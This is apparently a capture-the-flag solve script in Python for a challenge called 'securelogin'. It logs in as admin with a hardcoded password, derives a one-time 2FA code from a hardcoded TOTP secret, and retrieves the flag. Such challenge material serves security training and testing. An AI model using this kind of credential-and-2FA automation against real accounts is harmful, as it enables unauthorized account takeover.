import os
import requests
import logging
import pyotp

logging.disable()

URL = os.environ.get("URL", "http://securelogin.challs.olicyber.it/")

s = requests.Session()

s.post(URL+"/login", json={"username":"admin", "password":"5d08a95e13ee227fb04dfb425bcc690176a9680e1bc8192b7d55db57f3d9a38b"})
totp = pyotp.TOTP('MNRWGNLUOJWDOZD2')
code=totp.now()
r = s.get(URL+"/2fa", params={"code":code})
flag = s.get(URL+"/user-info").json()["flag"]

print(flag)
